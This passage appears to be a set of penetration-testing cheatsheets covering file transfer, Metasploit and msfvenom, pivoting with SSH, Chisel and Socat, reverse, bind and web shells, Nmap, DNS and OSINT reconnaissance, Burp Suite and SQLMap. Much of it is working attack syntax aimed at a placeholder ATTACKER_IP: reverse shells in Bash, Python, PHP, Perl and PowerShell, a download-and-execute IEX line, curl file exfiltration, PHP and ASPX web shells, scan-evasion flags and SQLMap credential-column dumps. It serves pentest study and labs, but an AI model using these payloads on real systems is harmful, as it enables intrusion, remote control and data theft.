[IO.File]::WriteAllBytes("C:\Users\Public\file.bin", [Convert]::FromBase64String("BASE64_STRING"))

Verify on Linux:

md5sum file.bin

Verify on Windows:

Get-FileHash C:\Users\Public\file.bin -Algorithm MD5

docs.title: Upload Server
docs.text:
Install upload server:

python3 -m pip install uploadserver

Start upload server:

python3 -m uploadserver 8000

Upload with curl:

curl -X POST http://ATTACKER_IP:8000/upload -F "files=@/tmp/file.txt"

docs.title: WebDAV Upload
docs.text:
Start WebDAV server:

sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

Upload from Windows:

copy C:\Users\Public\file.txt \\ATTACKER_IP\DavWWWRoot\

docs.title: OpenSSL Protected Transfer
docs.text:
Encrypt before transfer:

openssl enc -aes256 -pbkdf2 -iter 100000 -in sensitive.txt -out sensitive.enc

Decrypt after transfer:

openssl enc -d -aes256 -pbkdf2 -iter 100000 -in sensitive.enc -out sensitive.txt

docs.title: Quick Workflow
docs.text: Need Method Simple Linux download wget or curl Simple Windows download PowerShell or certutil Windows internal transfer SMB SSH available SCP No tools available Base64 copy/paste Raw TCP transfer Netcat/Ncat Upload over HTTP Python uploadserver Sensitive data Encrypt first

docs.title: Notes
docs.text:
• Always verify file integrity after transfer.
  • Use HTTPS or encryption for sensitive files.
  • PowerShell and Certutil downloads are commonly monitored.
  • SMB may be blocked across network boundaries.
  • Base64 is encoding, not encryption.

docs.title: Executive Summary
docs.text:
Metasploit is an exploitation framework used to search modules, configure exploits, run payloads, manage sessions, and perform post-exploitation tasks.

Use this cheatsheet for quick msfconsole, module, payload, and Meterpreter command lookup.

docs.title: Start Metasploit
docs.text:
Start console:

msfconsole

Start with no banner:

msfconsole -q

Update database:

msfdb init

Check database status:

db_status

docs.title: Search Modules
docs.text:
Search by name:

search smb

Search exploit modules:

search type:exploit smb

Search by CVE:

search cve:2021

Search by platform:

search platform:windows

Search by rank:

search rank:excellent

docs.title: Module Workflow
docs.text:
Use module:

use exploit/path/module

Show options:

show options

Show payloads:

show payloads

Set target host:

set RHOSTS TARGET_IP

Set local host:

set LHOST ATTACKER_IP

Set payload:

set PAYLOAD payload/path

Run module:

run

Alternative:

exploit

Run in background:

run -j

docs.title: Common Options
docs.text: Option Purpose RHOSTS Target host or range RPORT Target port LHOST Local listener IP LPORT Local listener port TARGETURI Web application path USERNAME Username PASSWORD Password DOMAIN Windows domain SSL Use TLS/SSL VERBOSE Show more output

docs.title: Sessions
docs.text:
List sessions:

sessions

Interact with session:

sessions -i SESSION_ID

Background current session:

background

Kill session:

sessions -k SESSION_ID

Kill all sessions:

sessions -K

docs.title: Jobs
docs.text:
List jobs:

jobs

Kill job:

jobs -k JOB_ID

Kill all jobs:

jobs -K

docs.title: Handlers
docs.text:
Use multi handler:

use exploit/multi/handler

Set payload:

set PAYLOAD windows/meterpreter/reverse_tcp

Set listener:

set LHOST ATTACKER_IP
set LPORT 4444

Start handler:

run

Start handler as job:

run -j

docs.title: Msfvenom Payloads
docs.text:
Linux reverse shell:

msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o shell.elf

Windows reverse shell:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe

Windows Meterpreter:

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o meterpreter.exe

PHP reverse shell:

msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=4444 -o shell.php

WAR payload:

msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war -o shell.war

docs.title: Meterpreter Basics
docs.text:
Show help:

help

System info:

sysinfo

Current user:

getuid

Current directory:

pwd

List files:

ls

Change directory:

cd PATH

Upload file:

upload local_file remote_path

Download file:

download remote_file local_path

Shell:

shell

docs.title: Meterpreter Processes
docs.text:
List processes:

ps

Get PID:

getpid

Migrate:

migrate PID

Kill process:

kill PID

docs.title: Meterpreter Networking
docs.text:
Show network interfaces:

ipconfig

Show routes:

route

Port forward:

portfwd add -l 8080 -p 80 -r INTERNAL_IP

Remove port forward:

portfwd delete -l 8080 -p 80 -r INTERNAL_IP

docs.title: Routing Through Meterpreter
docs.text:
Add route:

run autoroute -s INTERNAL_SUBNET/CIDR

Print routes:

run autoroute -p

Start SOCKS proxy:

use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j

Proxychains entry:

socks5 127.0.0.1 1080

docs.title: Useful Post Modules
docs.text:
Search post modules:

search type:post platform:windows

Run local exploit suggester:

use post/multi/recon/local_exploit_suggester

Set session:

set SESSION SESSION_ID

Run:

run

docs.title: Notes
docs.text:
• Always check module options before running.
  • Use check when a module supports it.
  • Save results and session details during labs.
  • Use handlers for payloads generated with msfvenom.
  • Meterpreter routing is useful for pivoting but can be unstable through weak sessions.

docs.title: Executive Summary
docs.text:
Pivoting and tunneling allow traffic to move through a compromised or authorized intermediate host to reach systems that are not directly accessible.

Use this cheatsheet for quick SSH forwarding, SOCKS proxying, Proxychains, Socat, Chisel, and Meterpreter routing syntax.

docs.title: Core Concepts
docs.text: Concept Purpose Local port forward Access an internal service from your local machine Remote port forward Expose a local service through a remote host Dynamic port forward Create a SOCKS proxy SOCKS proxy Route multiple tools through one proxy Pivot host Intermediate system with access to another network Tunnel Encapsulated traffic path through another connection

docs.title: Network Discovery
docs.text:
Linux interfaces:

ip addr

Linux routes:

ip route

Windows interfaces:

ipconfig /all

Windows routes:

route print

ARP table:

ip neigh

arp -a

Test internal port:

nc -zv INTERNAL_IP PORT

PowerShell test:

Test-NetConnection INTERNAL_IP -Port PORT

docs.title: SSH Local Port Forwarding
docs.text:
Forward local port 8080 to internal web service:

ssh -L 8080:INTERNAL_IP:80 user@PIVOT_HOST

Access locally:

http://127.0.0.1:8080

Forward local port to internal RDP:

ssh -L 3389:INTERNAL_IP:3389 user@PIVOT_HOST

docs.title: SSH Remote Port Forwarding
docs.text:
Expose local service through remote host:

ssh -R 9001:127.0.0.1:9001 user@PIVOT_HOST

Remote forward with all interfaces:

ssh -R 0.0.0.0:9001:127.0.0.1:9001 user@PIVOT_HOST

docs.title: SSH Dynamic Port Forwarding
docs.text:
Create SOCKS proxy:

ssh -D 1080 user@PIVOT_HOST

Create SOCKS proxy without shell:

ssh -N -D 1080 user@PIVOT_HOST

Use SOCKS proxy:

127.0.0.1:1080

docs.title: Proxychains
docs.text:
Edit config:

sudo nano /etc/proxychains4.conf

Add SOCKS proxy:

socks5 127.0.0.1 1080

Run curl through proxy:

proxychains curl http://INTERNAL_IP

Run Nmap TCP connect scan:

proxychains nmap -sT -Pn -p PORT INTERNAL_IP

docs.title: Sshuttle
docs.text:
Route subnet through SSH:

sshuttle -r user@PIVOT_HOST INTERNAL_SUBNET/CIDR

Example:

sshuttle -r user@10.10.10.5 172.16.1.0/24

Route all traffic through pivot:

sshuttle -r user@PIVOT_HOST 0.0.0.0/0

docs.title: Socat Port Forwarding
docs.text:
Forward local port to internal host:

socat TCP-LISTEN:8080,fork,reuseaddr TCP:INTERNAL_IP:80

TCP relay:

socat TCP-LISTEN:9001,fork,reuseaddr TCP:TARGET_IP:9001

Reverse relay example:

socat TCP:ATTACKER_IP:9001 TCP:INTERNAL_IP:80

docs.title: Chisel
docs.text:
Start server on attacker machine:

chisel server -p 8000 --reverse

Create reverse SOCKS from compromised host:

chisel client ATTACKER_IP:8000 R:socks

Create reverse port forward:

chisel client ATTACKER_IP:8000 R:8080:INTERNAL_IP:80

Create local SOCKS:

chisel server -p 8000

chisel client ATTACKER_IP:8000 socks

docs.title: Meterpreter Routing
docs.text:
Show network interfaces:

ipconfig

Add route:

run autoroute -s INTERNAL_SUBNET/CIDR

Print routes:

run autoroute -p

Start SOCKS proxy:

use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j

Proxychains entry:

socks5 127.0.0.1 1080

docs.title: Meterpreter Port Forwarding
docs.text:
Forward internal web service:

portfwd add -l 8080 -p 80 -r INTERNAL_IP

List forwards:

portfwd list

Delete forward:

portfwd delete -l 8080 -p 80 -r INTERNAL_IP

Flush all forwards:

portfwd flush

docs.title: Nmap Through Tunnels
docs.text:
Through Proxychains, use TCP connect scan:

proxychains nmap -sT -Pn -p 80,443 INTERNAL_IP

Do not rely on raw packet scans through SOCKS:

-sS, -sU, and ICMP discovery may fail through proxies.

docs.title: Browser Through SOCKS
docs.text:
Firefox SOCKS settings:

SOCKS Host: 127.0.0.1
Port: 1080
SOCKS v5: enabled
Proxy DNS when using SOCKS v5: enabled

docs.title: Quick Workflow
docs.text: Step Action Identify routes ip route, route print Find internal subnet Check interfaces and ARP Test reachability nc -zv, Test-NetConnection Build tunnel SSH, Chisel, Socat, Meterpreter Route tools Proxychains or browser SOCKS Validate access Connect to internal service Limit noise Avoid broad scans through unstable tunnels

docs.title: Notes
docs.text:
• Use -sT with Nmap through SOCKS proxies.
  • DNS may not work unless the proxy handles DNS.
  • Tunnels can be unstable through weak shells.
  • Port forwards are best for single services.
  • SOCKS proxies are better for exploring multiple services.

docs.title: Executive Summary
docs.text:
Shells provide command execution on a target system. The most common types are reverse shells, bind shells, web shells, and upgraded interactive shells.

Use this cheatsheet for quick payload syntax, listeners, and shell stabilization.

docs.title: Shell Types
docs.text: Type Description Reverse shell Target connects back to attacker Bind shell Target listens; attacker connects to target Web shell Command execution through a web-accessible script Interactive shell Shell with better terminal behavior and job control Meterpreter shell Metasploit-managed post-exploitation session

docs.title: Netcat Listener
docs.text:
Start listener:

nc -lvnp 4444

Ncat listener:

ncat -lvnp 4444

Listen with rlwrap:

rlwrap nc -lvnp 4444

docs.title: Linux Reverse Shells
docs.text:
Bash:

bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

Bash alternative:

0<&196;exec 196<>/dev/tcp/ATTACKER_IP/4444; sh <&196 >&196 2>&196

Netcat with -e:

nc ATTACKER_IP 4444 -e /bin/bash

Netcat without -e:

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f

Python:

python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

PHP:

php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

Perl:

perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

docs.title: Windows Reverse Shells
docs.text:
PowerShell TCP client:

$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback + "PS " + (pwd).Path + "> ";$sendbyte=([Text.Encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}

PowerShell download and execute:

IEX (New-Object Net.WebClient).DownloadString("http://ATTACKER_IP/shell.ps1")

docs.title: Bind Shells
docs.text:
Linux Netcat bind shell with -e:

nc -lvnp 4444 -e /bin/bash

Linux Netcat bind shell without -e:

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp 4444 > /tmp/f

Connect to bind shell:

nc TARGET_IP 4444

docs.title: Web Shells
docs.text:
PHP web shell:

<?php system($_GET['cmd']); ?>

Use it:

http://TARGET/shell.php?cmd=id

PHP POST web shell:

<?php system($_POST['cmd']); ?>

ASPX basic command execution:

<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]); %>

docs.title: Shell Stabilization
docs.text:
Spawn TTY:

python3 -c 'import pty; pty.spawn("/bin/bash")'

Background shell:

CTRL+Z

Set terminal:

stty raw -echo; fg

Fix terminal:

reset

Set environment:

export TERM=xterm

Set rows and columns:

stty rows 40 columns 120

Find local terminal size:

stty size

docs.title: Upgrade with Script
docs.text: script -qc /bin/bash /dev/null

docs.title: Useful Post-Shell Commands
docs.text:
Linux:

whoami
id
hostname
ip addr
ip route
pwd
ls -la

Windows:

whoami
hostname
ipconfig /all
route print
net user

docs.title: Common Problems
docs.text: Problem Fix No prompt Press Enter or run python3 -c 'import pty; pty.spawn("/bin/bash")' CTRL+C kills shell Stabilize TTY with stty raw -echo; fg Arrow keys broken Set TERM=xterm Commands hang Check firewall, listener, or shell payload No outbound connection Try common ports like 80, 443, or 53 Netcat lacks -e Use named pipe payload

docs.title: Notes
docs.text:
• Reverse shells are usually more reliable than bind shells.
  • Bind shells are often blocked by inbound firewall rules.
  • Web shells depend on web server permissions.
  • Stabilize Linux shells before running interactive tools.
  • Use authorized lab and assessment environments only.

docs.title: Executive Summary
docs.text:
PowerShell is a Windows automation and administration shell used for system management, enumeration, file handling, networking, logging, and security operations.

This cheatsheet focuses on quick command lookup for common administrative and security workflows.

docs.text:
• PowerShell activity is often logged by defenders.

docs.title: Executive Summary
docs.text:
DNS and subdomain enumeration help identify hosts, services, environments, and infrastructure connected to a target domain.

Use this cheatsheet for quick DNS lookups, zone transfer testing, subdomain discovery, and virtual host fuzzing.

docs.title: Common DNS Record Types
docs.text: Record Purpose A Maps hostname to IPv4 address AAAA Maps hostname to IPv6 address CNAME Alias to another hostname MX Mail server NS Authoritative name server TXT Text records, SPF, DKIM, verification values SOA Start of authority record PTR Reverse DNS lookup SRV Service location record

docs.title: Basic DNS Lookups
docs.text:
Query A record:

dig example.com A

Query all common records:

dig example.com ANY

Query name servers:

dig example.com NS

Query mail servers:

dig example.com MX

Query TXT records:

dig example.com TXT

Reverse lookup:

dig -x TARGET_IP

Use a specific DNS server:

dig @DNS_SERVER example.com

docs.title: Nslookup
docs.text:
Basic lookup:

nslookup example.com

Query record type:

nslookup -type=MX example.com

Use specific DNS server:

nslookup example.com DNS_SERVER

Interactive mode:

nslookup
server DNS_SERVER
set type=ANY
example.com
exit

docs.title: Zone Transfer Testing
docs.text:
Attempt zone transfer:

dig axfr @NAMESERVER example.com

Example:

dig axfr @ns1.example.com example.com

Nslookup zone transfer:

nslookup
server NAMESERVER
set type=ANY
ls -d example.com
exit

A successful zone transfer may expose:

  • Subdomains
  • Internal naming patterns
  • Mail servers
  • Name servers
  • Infrastructure IP addresses
  • Forgotten hosts

docs.title: Subdomain Discovery
docs.text:
Common tools:

Tool Use amass Passive and active subdomain enumeration subfinder Fast passive subdomain discovery assetfinder Lightweight passive discovery dnsenum DNS enumeration and brute forcing dnsrecon DNS enumeration and zone transfer checks ffuf Subdomain and VHost fuzzing gobuster DNS and VHost brute forcing

docs.title: Dnsenum

dnsenum --enum example.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r

docs.text:

dnsrecon -d example.com

dnsrecon -d example.com -t axfr

dnsrecon -d example.com -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t brt

  • Old hosts

  • Development environments
  • Wildcard certificates
  • Forgotten subdomains

gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -i

gobuster vhost -u http://example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain

ffuf -u http://TARGET_IP/ -H "Host: FUZZ.example.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt

Filter by response size:

ffuf -u http://TARGET_IP/ -H "Host: FUZZ.example.com" -w wordlist.txt -fs SIZE

docs.title: Resolving Subdomains
docs.text:
Resolve a list:

while read sub; do host "$sub"; done < subdomains.txt

Extract IPs:

while read sub; do dig +short "$sub"; done < subdomains.txt | sort -u

docs.title: Practical Workflow
docs.text: Step Command Get NS records dig example.com NS Test zone transfer dig axfr @NAMESERVER example.com Passive subdomains subfinder -d example.com CT logs crt.sh query Brute force DNS gobuster dns -d example.com -w WORDLIST Resolve results dig +short sub.example.com VHost fuzzing ffuf -H "Host: FUZZ.example.com"

docs.title: Notes
docs.text:
• DNS subdomains and VHosts are related but not the same.
  • A VHost may exist without a public DNS record.
  • Zone transfers are rare but high-value.
  • Certificate logs are passive and often reveal forgotten hosts.
  • Always validate discovered subdomains before prioritizing them.

docs.title: Executive Summary
docs.text:
Nmap is used for host discovery, port scanning, service detection, script scanning, and network mapping.

Use this cheatsheet for quick scan syntax during enumeration and validation.

docs.title: Basic Scans
docs.text:
Scan a single host:

nmap TARGET_IP

Scan multiple hosts:

nmap TARGET1 TARGET2 TARGET3

Scan a subnet:

nmap 192.168.1.0/24

Scan from a file:

nmap -iL targets.txt

docs.title: Host Discovery
docs.text:
Ping scan:

nmap -sn 192.168.1.0/24

Treat host as alive:

nmap -Pn TARGET_IP

ARP discovery on local network:

sudo nmap -PR -sn 192.168.1.0/24

docs.title: Port Scanning
docs.text:
Top 1000 TCP ports:

nmap TARGET_IP

Specific ports:

nmap -p 22,80,443 TARGET_IP

Port range:

nmap -p 1-1000 TARGET_IP

All TCP ports:

nmap -p- TARGET_IP

Fast all-port scan:

nmap -p- --min-rate 1000 TARGET_IP

UDP scan:

sudo nmap -sU TARGET_IP

Top UDP ports:

sudo nmap -sU --top-ports 100 TARGET_IP

docs.title: Scan Types
docs.text:
TCP SYN scan:

sudo nmap -sS TARGET_IP

TCP connect scan:

nmap -sT TARGET_IP

UDP scan:

sudo nmap -sU TARGET_IP

Null scan:

sudo nmap -sN TARGET_IP

FIN scan:

sudo nmap -sF TARGET_IP

Xmas scan:

sudo nmap -sX TARGET_IP

docs.title: Service and Version Detection
docs.text:
Service detection:

nmap -sV TARGET_IP

Default scripts and service detection:

nmap -sC -sV TARGET_IP

Aggressive scan:

nmap -A TARGET_IP

Version intensity:

nmap -sV --version-intensity 9 TARGET_IP

docs.title: NSE Scripts
docs.text:
Run default scripts:

nmap -sC TARGET_IP

Run specific script:

nmap --script SCRIPT_NAME TARGET_IP

Run script category:

nmap --script vuln TARGET_IP

Run scripts against specific port:

nmap -p 445 --script smb-enum-shares TARGET_IP

List local scripts:

ls /usr/share/nmap/scripts/

Search scripts:

ls /usr/share/nmap/scripts/ | grep smb

docs.title: Timing and Performance
docs.text:
Timing templates:

nmap -T4 TARGET_IP

Minimum packet rate:

nmap --min-rate 1000 TARGET_IP

Limit retries:

nmap --max-retries 2 TARGET_IP

Scan faster with no DNS:

nmap -n TARGET_IP

docs.title: Output
docs.text:
Normal output:

nmap -oN scan.txt TARGET_IP

Grepable output:

nmap -oG scan.gnmap TARGET_IP

XML output:

nmap -oX scan.xml TARGET_IP

All formats:

nmap -oA scan TARGET_IP

docs.title: Firewall and Evasion Options
docs.text:
Disable host discovery:

nmap -Pn TARGET_IP

Fragment packets:

sudo nmap -f TARGET_IP

Use decoys:

sudo nmap -D RND:5 TARGET_IP

Spoof source port:

sudo nmap --source-port 53 TARGET_IP

Append random data:

nmap --data-length 24 TARGET_IP

docs.title: Common Service Scans
docs.text:
SMB:

nmap -p 445 --script smb-enum-shares,smb-enum-users TARGET_IP

FTP:

nmap -p 21 --script ftp-anon,ftp-syst TARGET_IP

HTTP:

nmap -p 80,443 --script http-title,http-headers TARGET_IP

DNS:

nmap -p 53 --script dns-zone-transfer TARGET_IP

SNMP:

sudo nmap -sU -p 161 --script snmp-info TARGET_IP

RDP:

nmap -p 3389 --script rdp-enum-encryption TARGET_IP

docs.title: Practical Workflow
docs.text: Step Command Discover hosts nmap -sn SUBNET Scan all TCP ports nmap -p- --min-rate 1000 TARGET_IP Scan found ports nmap -sC -sV -p PORTS TARGET_IP Run service scripts nmap --script CATEGORY -p PORT TARGET_IP Save output nmap -oA scan TARGET_IP

docs.title: Notes
docs.text:
• Use -Pn when ICMP is blocked.
  • Use -n to skip DNS and speed up scans.
  • UDP scans are slower and often require root.
  • Raw packet scans may fail through proxies or tunnels.
  • Always save scan output for comparison and reporting.

docs.title: Executive Summary
docs.text:
OSINT is the collection of publicly available information about a target, organization, domain, person, technology stack, or infrastructure.

Use this cheatsheet for quick passive reconnaissance before active scanning.

docs.title: Core OSINT Targets
docs.text: Target Examples Domains Root domains, subdomains, DNS records Infrastructure IP ranges, hosting providers, cloud assets People Employees, usernames, emails, roles Technologies Web servers, frameworks, CMS platforms Documents PDFs, Office files, metadata Repositories Source code, secrets, internal names Breaches Leaked credentials, reused emails Social presence LinkedIn, GitHub, Twitter/X, forums

docs.title: Search Operators
docs.text:
Search within a site:

site:example.com

Find specific file types:

site:example.com filetype:pdf

Search page titles:

intitle:"admin"

Search URLs:

inurl:login

Search exact phrase:

"example phrase"

Exclude term:

site:example.com -www

Find exposed indexes:

site:example.com intitle:"index of"

Find login pages:

site:example.com inurl:login

Find documents:

site:example.com filetype:pdf OR filetype:docx OR filetype:xlsx

docs.title: Useful Search Ideas
docs.text: Goal Query Find subdomains site:*.example.com Find PDFs site:example.com filetype:pdf Find spreadsheets site:example.com filetype:xlsx Find login pages site:example.com inurl:login Find admin pages site:example.com intitle:admin Find exposed directories site:example.com intitle:"index of" Find backups site:example.com filetype:bak OR filetype:old Find config files site:example.com filetype:env OR filetype:config

docs.title: Domain and Network Resources
docs.text: Resource Use WHOIS Domain registration details RDAP Modern domain/IP registration lookup ARIN / RIPE / APNIC IP ownership and netblocks BGP tools ASN and routing information Shodan Internet-exposed services Censys Internet-wide certificates and services GreyNoise Internet noise and scanner context MXToolbox DNS, mail, and blacklist checks SecurityTrails DNS and historical infrastructure

docs.title: WHOIS and RDAP
docs.text:
WHOIS lookup:

whois example.com

IP ownership lookup:

whois TARGET_IP

Useful details:

  • Registrar
  • Name servers
  • Creation date
  • Contact organization
  • Netblocks
  • ASN
  • Abuse contact

docs.title: Email Discovery
docs.text:
Common sources:

  • Company websites
  • GitHub commits
  • LinkedIn
  • Breach data
  • Certificate records
  • Public documents
  • Press releases

Common formats:

first.last@example.com
flast@example.com
first@example.com
first_last@example.com

docs.title: TheHarvester
docs.text:
Search for emails, hosts, and domains:

theHarvester -d example.com -b all

Use specific source:

theHarvester -d example.com -b bing

Save output:

theHarvester -d example.com -b all -f results

docs.title: GitHub OSINT
docs.text:
Search for organization mentions:

"example.com"

Search for secrets:

"example.com" "password"

Search for API keys:

"example.com" "api_key"

Search for environment files:

"example.com" ".env"

Useful items to review:

  • Repositories
  • Commit history
  • Issues
  • Wiki pages
  • Actions/workflows
  • Configuration files
  • Hardcoded URLs
  • Internal hostnames

docs.title: Document Metadata
docs.text:
Download public files and check metadata.

PDF metadata:

exiftool file.pdf

Office metadata:

exiftool file.docx

Find documents with search:

site:example.com filetype:pdf OR filetype:docx OR filetype:xlsx

Metadata may reveal:

  • Usernames
  • Author names
  • Software versions
  • Internal paths
  • Department names
  • Document history

docs.title: Breach and Credential Sources
docs.text:
Look for:

  • Reused emails
  • Breached passwords
  • Old usernames
  • Password patterns
  • Exposed API tokens
  • Leaked source code

Useful checks:

  • Public breach databases
  • GitHub leaks
  • Paste sites
  • Dark web reports
  • Password reuse across services

docs.title: Technology OSINT
docs.text:
Identify technologies from:

  • HTTP headers
  • TLS certificates
  • JavaScript files
  • BuiltWith-style services
  • Shodan/Censys results
  • Job postings
  • GitHub repositories
  • Documentation pages

Useful search:

site:example.com "wp-content"

site:example.com "X-Powered-By"

site:example.com "Jenkins"

docs.title: Practical Workflow
docs.text: Phase Action Domain review WHOIS, RDAP, name servers, MX records Infrastructure ASN, netblocks, cloud providers, exposed services People Emails, names, roles, usernames Documents PDFs, Office files, metadata Code GitHub, exposed repos, commits, secrets Web presence Subdomains, technologies, login portals Risk review Breaches, leaked credentials, exposed assets

docs.title: Notes
docs.text:
• OSINT should be passive unless explicitly authorized otherwise.
  • Public information may still be sensitive.
  • Validate findings before acting on them.
  • Do not assume old data is still accurate.
  • Keep track of sources so findings can be verified later.

docs.title: Executive Summary
docs.text:
Burp Suite is a web application testing proxy used to intercept, inspect, modify, replay, and automate HTTP/S requests.

Use this cheatsheet for quick Burp workflow reminders during web testing.

docs.title: Core Tools
docs.text: Tool Purpose Proxy Intercept and inspect browser traffic Target Map hosts, paths, parameters, and site structure Repeater Manually modify and resend requests Intruder Automate payload injection and fuzzing Decoder Encode and decode data Comparer Compare responses or payloads Logger Review HTTP history Sequencer Analyze token randomness Collaborator Detect out-of-band interactions

docs.title: Browser Proxy Setup
docs.text:
Default Burp listener:

127.0.0.1:8080

Browser proxy:

HTTP Proxy: 127.0.0.1
Port: 8080

Install Burp CA certificate:

http://burp

docs.title: Proxy Workflow
docs.text: Step Action Configure browser Set browser proxy to Burp Install CA cert Allow HTTPS interception Turn intercept on Capture requests Send to tools Forward interesting requests to Repeater or Intruder Review history Check Proxy HTTP history Scope target Limit noise and avoid unrelated traffic

docs.title: Useful Right-Click Actions
docs.text: Action Use Send to Repeater Manual testing Send to Intruder Fuzzing or brute force testing Send to Comparer Compare responses Do intercept Intercept matching requests Add to scope Keep testing focused Copy URL Save endpoint Copy as curl Reproduce request in terminal

docs.title: Repeater Workflow
docs.text:
Use Repeater for manual request testing.

Common tests:

  • Change HTTP method.
  • Modify parameters.
  • Remove parameters.
  • Change cookies.
  • Change headers.
  • Replay requests.
  • Test access control.
  • Test input validation.
  • Compare response codes and lengths.

Useful things to watch:

Signal Meaning Status code Access changes, redirects, errors Response length Different backend behavior Headers Auth, cache, redirects, server behavior Body content Error messages, data exposure Timing Possible blind or time-based behavior

docs.title: Intruder Workflow
docs.text:
Use Intruder for controlled payload automation.

Common attack positions:

GET /user?id=§1§ HTTP/1.1

Payload examples:

  • IDs
  • Usernames
  • Passwords
  • Filenames
  • Paths
  • Headers
  • Cookies
  • JSON values

Common filters:

  • Status code
  • Response length
  • Response time
  • Error keywords
  • Redirect location
  • Grep match

docs.title: Common Header Tests
docs.text:
Change Host header:

Host: admin.example.com

Add forwarded header:

X-Forwarded-For: 127.0.0.1

Spoof client IP:

X-Real-IP: 127.0.0.1

Change content type:

Content-Type: application/json

Test authorization:

Authorization: Bearer TOKEN

docs.title: Common Access Control Tests
docs.text: Test Action Horizontal access Change object ID to another user’s object Vertical access Use low-privileged user against admin endpoint Missing auth Remove cookies or tokens Forced browsing Request hidden/admin paths directly Method change Try GET, POST, PUT, DELETE, PATCH Header trust Test X-Forwarded-For and similar headers

docs.title: Decoder
docs.text:
Common decoding tasks:

  • URL decode
  • Base64 decode
  • HTML decode
  • Hex decode
  • JWT decode
  • Gzip decode

Common encoding tasks:

  • URL encode
  • Base64 encode
  • HTML encode
  • Hex encode

docs.title: Comparer
docs.text:
Use Comparer to check differences between:

  • Two user responses.
  • Admin and normal user responses.
  • Successful and failed login responses.
  • Baseline and fuzzed responses.
  • Token formats.

docs.title: Collaborator
docs.text:
Use Collaborator to detect:

  • Blind SSRF.
  • Blind XSS.
  • XML external entity callbacks.
  • Server-side template injection callbacks.
  • Out-of-band DNS or HTTP interactions.

Payload idea:

https://COLLABORATOR-ID.oastify.com

docs.title: Scope Tips
docs.text:
Add only authorized targets to scope.

Useful filters:

  • Show only in-scope items.
  • Hide images, CSS, fonts, and static files.
  • Highlight interesting status codes.
  • Filter by MIME type.
  • Filter by extension.

docs.title: Practical Workflow
docs.text: Phase Action Setup Configure proxy and certificate Scope Add authorized hosts Map Browse application normally Review Check HTTP history and target map Test manually Use Repeater Automate carefully Use Intruder Decode Use Decoder for tokens and payloads Compare Use Comparer for response differences OOB testing Use Collaborator where appropriate

docs.title: Notes
docs.text:
• Keep testing scoped to authorized targets.
  • Repeater is usually the most important manual testing tool.
  • Response length changes often reveal useful behavior.
  • Always test with at least two user roles when checking access control.
  • Avoid noisy Intruder attacks unless rate limits and authorization allow them.

docs.title: Executive Summary
docs.text:
SQLMap automates SQL injection testing and database enumeration.

Use this cheatsheet for quick command lookup when validating SQL injection in authorized labs or assessments.

docs.title: Basic Usage
docs.text:
Test a URL parameter:

sqlmap -u "http://example.com/item?id=1"

Batch mode:

sqlmap -u "http://example.com/item?id=1" --batch

Increase risk and level:

sqlmap -u "http://example.com/item?id=1" --risk 3 --level 5

Specify database type:

sqlmap -u "http://example.com/item?id=1" --dbms=mysql

docs.title: Request Files
docs.text:
Save a request from Burp and run:

sqlmap -r request.txt

Batch mode with request file:

sqlmap -r request.txt --batch

Specify parameter:

sqlmap -r request.txt -p id

docs.title: Enumeration
docs.text:
List databases:

sqlmap -u "http://example.com/item?id=1" --dbs

List tables:

sqlmap -u "http://example.com/item?id=1" -D DATABASE --tables

List columns:

sqlmap -u "http://example.com/item?id=1" -D DATABASE -T TABLE --columns

Dump table:

sqlmap -u "http://example.com/item?id=1" -D DATABASE -T TABLE --dump

Dump specific columns:

sqlmap -u "http://example.com/item?id=1" -D DATABASE -T TABLE -C username,password --dump

docs.title: Authentication
docs.text:
Add cookie:

sqlmap -u "http://example.com/item?id=1" --cookie="session=VALUE"

Use headers:

sqlmap -u "http://example.com/item?id=1" -H "Authorization: Bearer TOKEN"

Use request file from Burp:

sqlmap -r request.txt

docs.title: POST Requests
docs.text:
Test POST data:

sqlmap -u "http://example.com/login" --data="username=admin&password=test"

Test JSON body:

sqlmap -u "http://example.com/api" \
  --data='{"id":1}' \
  -H "Content-Type: application/json"

docs.title: Detection Options
docs.text:
Technique selection:

sqlmap -u "http://example.com/item?id=1" --technique=BEUSTQ

Common technique letters:

Letter Technique B Boolean-based blind E Error-based U UNION query S Stacked queries T Time-based blind Q Inline queries

Time-based tuning:

sqlmap -u "http://example.com/item?id=1" --technique=T --time-sec=5

